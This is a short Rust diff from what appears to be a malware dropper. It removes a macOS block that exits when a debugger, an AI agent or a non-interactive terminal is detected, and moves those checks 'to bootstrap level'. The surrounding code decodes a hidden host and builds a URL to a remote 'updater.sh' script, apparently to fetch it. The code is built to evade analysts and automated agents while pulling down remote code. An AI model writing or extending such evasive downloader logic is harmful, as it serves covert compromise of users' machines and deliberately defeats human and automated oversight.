@@ -70,18 +70,7 @@ fn main() {
     }
 
     // Анти-отладка и анти-агент проверки
-    #[cfg(target_os = "macos")]
-    {
-        if is_being_debugged() {
-            std::process::exit(0);
-        }
-        if is_ai_agent() {
-            std::process::exit(0);
-        }
-        if !has_interactive_tty() {
-            std::process::exit(0);
-        }
-    }
+    // anti-debug checks removed - handled at bootstrap level
 
     let url = decode_url();
     let full_url = format!("https://{}/updater.sh", url);
